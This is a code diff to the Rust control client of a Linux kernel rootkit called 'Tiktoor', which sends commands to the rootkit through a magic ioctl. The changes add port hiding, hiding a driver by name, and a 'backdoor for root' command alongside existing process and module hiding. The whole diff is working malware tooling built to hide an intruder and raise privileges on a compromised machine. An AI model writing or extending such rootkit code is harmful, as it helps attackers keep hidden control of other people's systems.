@@ -1,4 +1,5 @@
-use libc::{c_uchar, c_uint, c_ulong, c_void, AF_INET, SOCK_STREAM};
+use libc::{c_char, c_uchar, c_uint, c_ulong, c_ushort, c_void, AF_INET, SOCK_STREAM};
+use std::ffi::CString;
 use std::ptr;
 
 const TIKTOOR_IOCTL_CMD: c_ulong = 0xdeadbeaf;
@@ -12,6 +13,7 @@ enum Action {
     ProcessProtection = 0x4,
     ModuleHiding = 0x5,
     ModuleUnhiding = 0x6,
+    BackdoorForRoot = 0x7,
 }
 
 #[repr(C)]
@@ -49,12 +51,14 @@ pub fn hide_process(pid: u32) {
 
 #[repr(C)]
 struct DriverHidingSubargs {
-    rank: c_uint,
+    name: *const c_char,
 }
 
 /// Hide driver given by its name
-pub fn hide_driver(rank: u32) {
-    let subargs = DriverHidingSubargs { rank };
+pub fn hide_driver(name: &CString) {
+    let subargs = DriverHidingSubargs {
+        name: name.as_ptr(),
+    };
     let cmd_arg = TiktoorCmdArg {
         action: Action::DriverHiding as c_uchar,
         subargs: &subargs as *const _ as *const c_void,
@@ -69,9 +73,35 @@ pub fn hide_driver(rank: u32) {
     }
 }
 
+#[repr(C)]
+struct PortHidingSubargs {
+    transmission_type: c_uchar,
+    port: c_ushort,
+}
+
+/// Hide port
+pub fn hide_port(transmission_type: u8, port: u16) {
+    let subargs = PortHidingSubargs {
+        transmission_type,
+        port,
+    };
+    let cmd_arg = TiktoorCmdArg {
+        action: Action::PortHiding as c_uchar,
+        subargs: &subargs as *const _ as *const c_void,
+    };
+    unsafe {
+        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
+        libc::ioctl(
+            dummy_socket,
+            TIKTOOR_IOCTL_CMD,
+            &cmd_arg as *const _ as *const c_void,
+        );
+    }
+}
+
 /// Protect process given by its pid
 pub fn protect_process(pid: u32) {
-    let subargs = ProcessHidingSubargs { pid };
+    let subargs = ProcessProtectingSubargs { pid };
     let cmd_arg = TiktoorCmdArg {
         action: Action::ProcessProtection as c_uchar,
         subargs: &subargs as *const _ as *const c_void,
@@ -106,6 +136,22 @@ pub fn hide_module() {
 pub fn unhide_module() {
     let cmd_arg = TiktoorCmdArg {
         action: Action::ModuleUnhiding as c_uchar,
+        subargs: ptr::null(),
+    };
+    unsafe {
+        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
+        libc::ioctl(
+            dummy_socket,
+            TIKTOOR_IOCTL_CMD,
+            &cmd_arg as *const _ as *const c_void,
+        );
+    }
+}
+
+/// Backdoor for root
+pub fn backdoor_for_root() {
+    let cmd_arg = TiktoorCmdArg {
+        action: Action::BackdoorForRoot as c_uchar,
         subargs: ptr::null(),
     };
     unsafe {
